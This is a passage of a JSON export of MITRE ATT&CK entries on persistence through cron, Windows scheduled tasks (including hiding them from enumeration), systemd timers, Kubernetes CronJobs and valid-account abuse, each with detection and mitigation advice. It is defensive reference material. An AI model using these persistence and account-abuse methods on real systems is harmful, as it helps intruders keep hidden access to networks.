href=\"https://labs.sentinelone.com/20-common-tools-techniques-used-by-macos-threat-actors-malware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: 20 macOS Common Tools and Techniques)</a> The <code>cron</code> utility is a time-based job scheduler for Unix-like operating systems.  The <code> crontab</code> file contains the schedule of cron entries to be run and the specified times for execution. Any <code>crontab</code> files are stored in operating system-specific file paths.\n\nAn adversary may use <code>cron</code> in Linux or Unix environments to execute programs at system startup or on a scheduled basis for Persistence. In ESXi environments, cron jobs must be created directly via the crontab file (e.g., <code>/var/spool/cron/crontabs/root</code>). <a href=\"https://www.cloudsek.com/blog/analysis-of-files-used-in-esxiargs-ransomware-attack-against-vmware-esxi-servers\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CloudSEK ESXiArgs 2023)</a>","detection":"Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc.  \n\nSuspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","platforms":["Linux","macOS","ESXi"],"dataSources":["File: File Modification","Process: Process Creation","Scheduled Job: Scheduled Job Creation","Command: Command Execution"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"<code>cron</code> permissions are controlled by <code>/etc/cron.allow and /etc/cron.deny</code>. If there is a <code>cron.allow</code> file, then the user or users that need to use <code>cron</code> will need to be listed in the file. <code>cron.deny</code> is used to explicitly disallow users from using cron. If neither files exist, then only the super user is allowed to run cron."},{"id":"M1047","name":"Audit","description":"Review changes to the <code>cron</code> schedule. <code>cron</code> execution can be reviewed within the <code>/var/log</code> directory. To validate the location of the <code>cron</code> log file, check the syslog config at <code>/etc/rsyslog.conf</code> or <code>/etc/syslog.conf</code>."}]},{"id":"T1053.005","name":"Scheduled Task","description":"Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The schtasks utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. <a href=\"https://stackoverflow.com/questions/2913816/how-to-find-the-location-of-the-scheduled-tasks-folder\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Stack Overflow)</a> In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library and Windows Management Instrumentation (WMI) to create a scheduled task. Adversaries may also utilize the Powershell Cmdlet <code>Invoke-CimMethod</code>, which leverages WMI class <code>PS_ScheduledTask</code> to create a scheduled task via an XML path. <a href=\"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.md\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Red Canary - Atomic Red Team)</a>\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to System Binary Proxy Execution, adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes. <a href=\"https://www.proofpoint.com/us/blog/threat-insight/serpent-no-swiping-new-backdoor-targets-french-entities-unique-attack-chain\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ProofPoint Serpent)</a>\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. Hide Artifacts) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from <code>schtasks /query</code> and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions). <a href=\"https://github.com/SigmaHQ/sigma/blob/master/rules/windows/registry/registry_delete/registry_delete_schtasks_hide_task_via_sd_value_removal.yml\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SigmaHQ)</a> <a href=\"https://www.microsoft.com/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Tarrask scheduled task)</a> Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., <code>Index</code> value) within associated registry keys. <a href=\"https://blog.qualys.com/vulnerabilities-threat-research/2022/06/20/defending-against-scheduled-task-attacks-in-windows-environments\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Defending Against Scheduled Task Attacks in Windows Environments)</a>","detection":"Monitor process execution from the <code>svchost.exe</code> in Windows 10 and the Windows Task Scheduler <code>taskeng.exe</code> for older versions of Windows. <a href=\"https://x.com/leoloobeek/status/939248813465853953\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Twitter Leoloobeek Scheduled Task)</a> If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in %systemroot%\\System32\\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc.\n\nConfigure event logging for scheduled task creation and changes by enabling the \"Microsoft-Windows-TaskScheduler/Operational\" setting within the event logging service. <a href=\"https://social.technet.microsoft.com/Forums/en-US/e5bca729-52e7-4fcb-ba12-3225c564674c/scheduled-tasks-history-retention-settings?forum=winserver8gen\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Forum Scheduled Task Operational Setting)</a> Several events will then be logged on scheduled task activity, including: <a href=\"https://technet.microsoft.com/library/dd315590.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Scheduled Task Events)</a> <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-other-object-access-events\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Scheduled Task Events Win10)</a>\n\n* Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registered\n* Event ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updated\n* Event ID 141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deleted\n* Event ID 4698 on Windows 10, Server 2016 - Scheduled task created\n* Event ID 4700 on Windows 10, Server 2016 - Scheduled task enabled\n* Event ID 4701 on Windows 10, Server 2016 - Scheduled task disabled\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. <a href=\"https://technet.microsoft.com/en-us/sysinternals/bb963902\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Autoruns)</a>\n\nRemote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.","platforms":["Windows"],"dataSources":["Windows Registry: Windows Registry Key Creation","File: File Modification","File: File Creation","Process: Process Creation","Command: Command Execution","Network Traffic: Network Traffic Flow","Scheduled Job: Scheduled Job Creation"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create scheduled tasks on remote systems."},{"id":"M1026","name":"Privileged Account Management","description":"Configure the Increase Scheduling Priority option to only allow the Administrators group the rights to schedule a priority process. This can be configured through GPO: Computer Configuration &gt; [Policies] &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; User Rights Assignment: Increase scheduling priority. <a href=\"https://technet.microsoft.com/library/dn221960.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Scheduling Priority)</a>"},{"id":"M1028","name":"Operating System Configuration","description":"Configure settings for scheduled tasks to force tasks to run under the context of the authenticated account instead of allowing them to run as SYSTEM. The associated Registry key is located at HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\SubmitControl. The setting can be configured through GPO: Computer Configuration &gt; [Policies] &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; Security Options: Domain Controller: Allow server operators to schedule tasks, set to disabled. <a href=\"https://technet.microsoft.com/library/jj852168.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Server Operator Scheduled Task)</a>"},{"id":"M1047","name":"Audit","description":"Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges. <a href=\"https://github.com/mattifestation/PowerSploit\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Powersploit)</a>"}]},{"id":"T1053.006","name":"Systemd Timers","description":"Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension <code>.timer</code> that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to Cron in Linux environments. <a href=\"https://wiki.archlinux.org/index.php/Systemd/Timers\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: archlinux Systemd Timers Aug 2020)</a> Systemd timers may be activated remotely via the <code>systemctl</code> command line utility, which operates over SSH. <a href=\"https://www.tecmint.com/control-systemd-services-on-remote-linux-server/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Systemd Remote Control)</a>\n\nEach <code>.timer</code> file must have a corresponding <code>.service</code> file with the same name, e.g., <code>example.timer</code> and <code>example.service</code>. <code>.service</code> files are Systemd Service unit files that are managed by the systemd system and service manager. <a href=\"http://man7.org/linux/man-pages/man1/systemd.1.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Linux man-pages: systemd January 2014)</a> Privileged timers are written to <code>/etc/systemd/system/</code> and <code>/usr/lib/systemd/system</code> while user level are written to <code>~/.config/systemd/user/</code>.\n\nAn adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence. <a href=\"https://www.bleepingcomputer.com/news/security/malware-found-in-arch-linux-aur-package-repository/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018)</a> <a href=\"https://gist.github.com/campuscodi/74d0d2e35d8fd9499c76333ce027345a\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: gist Arch package compromise 10JUL2018)</a> <a href=\"https://lists.archlinux.org/pipermail/aur-general/2018-July/034153.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: acroread package compromised Arch Linux Mail 8JUL2018)</a> Timers installed using privileged paths may be used to maintain root level persistence. Adversaries may also install user level timers to achieve user level persistence. <a href=\"https://www.hybrid-analysis.com/sample/28553b3a9d2ad4361d33d29ac4bf771d008e0073cec01b5561c6348a608f8dd7?environmentId=300\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Falcon Sandbox smp: 28553b3a9d)</a>","detection":"Systemd timer unit files may be detected by auditing file creation and modification events within the <code>/etc/systemd/system</code>, <code>/usr/lib/systemd/system/</code>, and <code>~/.config/systemd/user/</code> directories, as well as associated symbolic links. Suspicious processes or scripts spawned in this manner will have a parent process of ‘systemd’, a parent process ID of 1, and will usually execute as the ‘root’ user.\n\nSuspicious systemd timers can also be identified by comparing results against a trusted system baseline. Malicious systemd timers may be detected by using the systemctl utility to examine system wide timers: <code>systemctl list-timers –all</code>. Analyze the contents of corresponding <code>.service</code> files present on the file system and ensure that they refer to legitimate, expected executables.\n\nAudit the execution and command-line arguments of the 'systemd-run' utility as it may be used to create timers. <a href=\"https://wiki.archlinux.org/index.php/Systemd/Timers\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: archlinux Systemd Timers Aug 2020)</a>","platforms":["Linux"],"dataSources":["File: File Modification","Process: Process Creation","Command: Command Execution","Scheduled Job: Scheduled Job Creation"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit user access to system utilities such as 'systemctl' or 'systemd-run' to users who have a legitimate need."},{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Restrict read/write access to systemd <code>.timer</code> unit files to only select privileged users who have a legitimate need to manage system services."},{"id":"M1026","name":"Privileged Account Management","description":"Limit access to the root account and prevent users from creating and/or modifying systemd timer unit files."}]},{"id":"T1053.007","name":"Container Orchestration Job","description":"Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks. <a href=\"https://kubernetes.io/docs/concepts/workloads/controllers/job/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes Jobs)</a> <a href=\"https://kubernetes.io/docs/concepts/workloads/controllers/cron-jobs/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes CronJob)</a> An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster. <a href=\"https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Threat Matrix for Kubernetes)</a>","detection":"Monitor for the anomalous creation of scheduled jobs in container orchestration environments. Use logging agents on Kubernetes nodes and retrieve logs from sidecar proxies for application and resource pods to monitor malicious container orchestration job deployments.","platforms":["Containers"],"dataSources":["File: File Creation","Container: Container Creation","Scheduled Job: Scheduled Job Creation"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit privileges of user accounts and remediate privilege escalation vectors so only authorized administrators can create container orchestration jobs."},{"id":"M1026","name":"Privileged Account Management","description":"Ensure containers are not running as root by default. In Kubernetes environments, consider defining Pod Security Standards that prevent pods from running privileged containers. <a href=\"https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes Hardening Guide)</a>"}]}]},{"id":"T1078","name":"Valid Accounts","description":"Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop. <a href=\"https://www.volexity.com/blog/2022/06/15/driftingcloud-zero-day-sophos-firewall-exploitation-and-an-insidious-breach/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: volexity_0day_sophos_FW)</a> Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account. <a href=\"https://www.cisa.gov/uscert/ncas/alerts/aa22-074a\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CISA MFA PrintNightmare)</a>\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise. <a href=\"https://technet.microsoft.com/en-us/library/dn535501.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Credential Theft)</a>","detection":"Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services. <a href=\"https://technet.microsoft.com/en-us/library/dn487457.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Audit Policy)</a> Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nPerform regular audits of domain and local system accounts to detect accounts that may have been created by an adversary for persistence. Checks on these accounts could also include whether default accounts such as Guest have been activated. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately.","platforms":["Containers","ESXi","IaaS","Identity Provider","Linux","macOS","Network Devices","Office Suite","SaaS","Windows"],"dataSources":["Logon Session: Logon Session Creation","User Account: User Account Authentication","Logon Session: Logon Session Metadata"],"mitigations":[{"id":"M1013","name":"Application Developer Guidance","description":"Ensure that applications do not store sensitive data or credentials insecurely. (e.g. plaintext credentials in code, published credentials in repositories, or credentials in public cloud storage)."},{"id":"M1015","name":"Active Directory Configuration","description":"Disable legacy authentication, which does not support MFA, and require the use of modern authentication protocols instead."},{"id":"M1017","name":"User Training","description":"Applications may send push notifications to verify a login as a form of multi-factor authentication (MFA). Train users to only accept valid push notifications and to report suspicious push notifications."},{"id":"M1018","name":"User Account Management","description":"Regularly audit user accounts for activity and deactivate or remove any that are no longer needed."},{"id":"M1026","name":"Privileged Account Management","description":"Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account. <a href=\"https://technet.microsoft.com/en-us/library/dn535501.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Credential Theft)</a> <a href=\"https://technet.microsoft.com/en-us/library/dn487450.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Least Privilege)</a> These audits should also include if default accounts have been enabled, or if new local accounts are created that have not been authorized. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. <a href=\"https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material#a-nameesaebmaesae-administrative-forest-design-approach\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Securing Privileged Access)</a>"},{"id":"M1027","name":"Password Policies","description":"Applications and appliances that utilize default username and password should be changed immediately after the installation, and before deployment to a production environment. <a href=\"https://www.us-cert.gov/ncas/alerts/TA13-175A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT Alert TA13-175A Risks of Default Passwords on the Internet)</a> When possible, applications that use SSH keys should be updated periodically and properly secured.\n\nPolicies should minimize (if not eliminate) reuse of passwords between different user accounts, especially employees using the same credentials for personal accounts that may not be defended by enterprise security resources."},{"id":"M1032","name":"Multi-factor Authentication","description":"Implement multi-factor authentication (MFA) across all account types, including default, local, domain, and cloud accounts, to prevent unauthorized access, even if credentials are compromised. MFA provides a critical layer of security by requiring multiple forms of verification beyond just a password. This measure significantly reduces the risk of adversaries abusing valid accounts to gain initial access, escalate privileges, maintain persistence, or evade defenses within your network."},{"id":"M1036","name":"Account Use Policies","description":"Use conditional access policies to block logins from non-compliant devices or from outside defined organization IP ranges. <a href=\"https://learn.microsoft.com/en-us/azure/active-directory/conditional-access/concept-conditional-access-policy-common\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Common Conditional Access Policies)</a>"}],"subTechniques":[{"id":"T1078.001","name":"Default Accounts","description":"Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS, the root user account in ESXi, and the default service account in Kubernetes. <a href=\"https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/local-accounts\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Local Accounts Feb 2019)</a> <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/id_root-user.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS Root User)</a> <a href=\"https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Threat Matrix for Kubernetes)</a>\n\nDefault accounts are not limited to client machines; rather, they also include accounts that are preset for equipment such as network devices and computer applications, whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen Private Keys or credential materials to legitimately connect to remote environments via Remote Services. <a href=\"https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/linux/ssh\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Metasploit SSH Module)</a>\n\nDefault accounts may be created on a system after initial setup by connecting or integrating it with another application. For example, when an ESXi server is connected to a vCenter server, a default privileged account called <code>vpxuser</code> is created on the ESXi server. If a threat actor is able to compromise this account’s credentials (for example, via Exploitation for Credential Access on the vCenter host), they will then have access to the ESXi server. <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/vmware-esxi-zero-day-bypass/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)</a> <a href=\"https://pentera.io/blog/information-disclosure-in-vmware-vcenter/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Pentera vCenter Information Disclosure)</a>","detection":"Monitor whether default accounts have been activated or logged into. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately.","platforms":["Containers","ESXi","IaaS","Identity Provider","Linux","macOS","Network Devices","Office Suite","SaaS","Windows"],"dataSources":["Logon Session: Logon Session Creation","User Account: User Account Authentication"],"mitigations":[{"id":"M1027","name":"Password Policies","description":"Applications and appliances that utilize default username and password should be changed immediately after the installation, and before deployment to a production environment. <a href=\"https://www.us-cert.gov/ncas/alerts/TA13-175A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT Alert TA13-175A Risks of Default Passwords on the Internet)</a>"},{"id":"M1032","name":"Multi-factor Authentication","description":"Implement multi-factor authentication (MFA) for default accounts whenever possible to prevent unauthorized access, even if credentials for these accounts are compromised. MFA adds an additional layer of security that requires more than just a username and password, making it significantly harder for adversaries to exploit these accounts for initial access or lateral movement."}]},{"id":"T1078.002","name":"Domain Accounts","description":"Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. <a href=\"https://technet.microsoft.com/en-us/library/dn535501.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Credential Theft)</a> Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services. <a href=\"https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-accounts\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft AD Accounts)</a>\n\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as OS Credential Dumping or password reuse, allowing access to privileged resources of the domain.","detection":"Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services. <a href=\"https://technet.microsoft.com/en-us/library/dn487457.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Audit Policy)</a> Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nOn Linux, check logs and other artifacts created by use of domain authentication services, such as the System Security Services Daemon (sssd). <a href=\"https://ubuntu.com/server/docs/service-sssd\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Ubuntu SSSD Docs)</a> \n\nPerform regular audits of domain accounts to detect accounts that may have been created by an adversary for persistence.","platforms":["ESXi","Linux","macOS","Windows"],"dataSources":["User Account: User Account Authentication","Logon Session: Logon Session Creation","Logon Session: Logon Session Metadata"],"mitigations":[{"id":"M1017","name":"User Training","description":"Applications may send push notifications to verify a login as a form of multi-factor authentication (MFA). Train users to only accept valid push notifications and to report suspicious push notifications."},{"id":"M1018","name":"User Account Management","description":"Regularly review and manage domain accounts to ensure that only active, necessary accounts exist. Remove or disable inactive and unnecessary accounts to reduce the risk of adversaries abusing these accounts to gain unauthorized access or move laterally within the network."},{"id":"M1026","name":"Privileged Account Management","description":"Audit domain account permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled and use of accounts is segmented, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. Limit credential overlap across systems to prevent access if account credentials are obtained."},{"id":"M1027","name":"Password Policies","description":"Implement and enforce strong password policies for domain accounts to ensure passwords are complex, unique, and regularly rotated. This reduces the likelihood of password guessing, credential stuffing, and other attack methods that rely on weak or static credentials."},{"id":"M1032","name":"Multi-factor Authentication","description":"Integrating multi-factor authentication (MFA) as part of organizational policy can greatly reduce the risk of an adversary gaining control of valid credentials that may be used for additional tactics such as initial access, lateral movement, and collecting information. MFA can also be used to restrict access to cloud resources and APIs."}]},{"id":"T1078.003","name":"Local Accounts","description":"Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.\n\nLocal Accounts may also be abused to elevate privileges and harvest credentials through OS Credential Dumping. Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.","detection":"Perform regular audits of local system accounts to detect accounts that may have been created by an adversary for persistence. Look for suspicious account behavior, such as accounts logged in at odd times or outside of business hours.","platforms":["Containers","ESXi","Linux","macOS","Network Devices","Windows"],"dataSources":["Logon Session: Logon Session Creation","Logon Session: Logon Session Metadata","User Account: User Account Authentication"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Enforce user account management practices for local accounts to limit access and remove inactive or unused accounts. By doing so, you reduce the attack surface available to adversaries and prevent unauthorized access to local systems."},{"id":"M1026","name":"Privileged Account Management","description":"Audit local accounts permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account. <a href=\"https://technet.microsoft.com/en-us/library/dn535501.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Credential Theft)</a> <a href=\"https://technet.microsoft.com/en-us/library/dn487450.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Least Privilege)</a> Limit the usage of local administrator accounts to be used for day-to-day operations that may expose them to potential adversaries. \n\nFor example, audit the use of service accounts in Kubernetes, and avoid automatically granting them access to the Kubernetes API if this is not required. <a href=\"https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes Service Accounts)</a> Implementing LAPS may also help prevent reuse of local administrator credentials across a domain. <a href=\"https://blogs.technet.microsoft.com/secguide/2018/12/10/remote-use-of-local-accounts-laps-changes-everything/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Remote Use of Local)</a>"},{"id":"M1027","name":"Password Policies","description":"Ensure that local administrator accounts have complex, unique passwords across all systems on the network."},{"id":"M1032","name":"Multi-factor Authentication","description":"Enable multi-factor authentication (MFA) for local accounts to add an extra layer of protection against credential theft and misuse. MFA can be implemented using methods like mobile-based authenticators or hardware tokens, even in environments that do not rely on domain controllers or cloud services. This additional security measure can help reduce the risk of adversaries gaining unauthorized access to local systems and resources."}]},{"id":"T1078.004","name":"Cloud Accounts","description":"Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory. <a href=\"https://aws.amazon.com/identity/federation/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS Identity Federation)</a> <a href=\"https://cloud.google.com/solutions/federating-gcp-with-active-directory-introduction\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Federating GC)</a> <a href=\"https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/deployment/how-to-connect-fed-azure-adfs\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Deploying AD Federation)</a>\n\nService or user accounts may be targeted by adversaries through Brute Force, Phishing, or various other means to gain access to the environment. Federated or synced accounts may be a pathway for the adversary to affect both on-premises systems and cloud environments - for example, by leveraging shared credentials to log onto Remote Services. High privileged cloud accounts, whether federated, synced, or cloud-only, may also allow pivoting to on-premises environments by leveraging SaaS-based Software Deployment Tools to run commands on hybrid-joined devices.\n\nAn adversary may create long lasting Additional Cloud Credentials on a compromised cloud account to maintain persistence in the environment. Such credentials may also be used to bypass security controls such as multi-factor authentication. \n\nCloud accounts may also be able to assume Temporary Elevated Cloud Access or other privileges through various means within the environment. Misconfigurations in role assignments or role assumption policies may allow an adversary to use these mechanisms to leverage permissions outside the intended scope of the account. Such over privileged accounts may be used to harvest sensitive data from online storage accounts and databases through Cloud API or other methods. For example, in Azure environments, adversaries may target Azure Managed Identities, which allow associated Azure resources to request access tokens. By compromising a resource with an attached Managed Identity, such as an Azure VM, adversaries may be able to Steal Application Access Tokens to move laterally across the cloud environment. <a href=\"https://posts.specterops.io/managed-identity-attack-paths-part-1-automation-accounts-82667d17187a?gi=6a9daedade1c\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpecterOps Managed Identity 2022)</a>","detection":"Monitor the activity of cloud accounts to detect abnormal or malicious behavior, such as accessing information outside of the normal function of the account or account usage at atypical hours.","platforms":["IaaS","Identity Provider","Office Suite","SaaS"],"dataSources":["User Account: User Account Authentication","Logon Session: Logon Session Metadata","Logon Session: Logon Session Creation"],"mitigations":[{"id":"M1015","name":"Active Directory 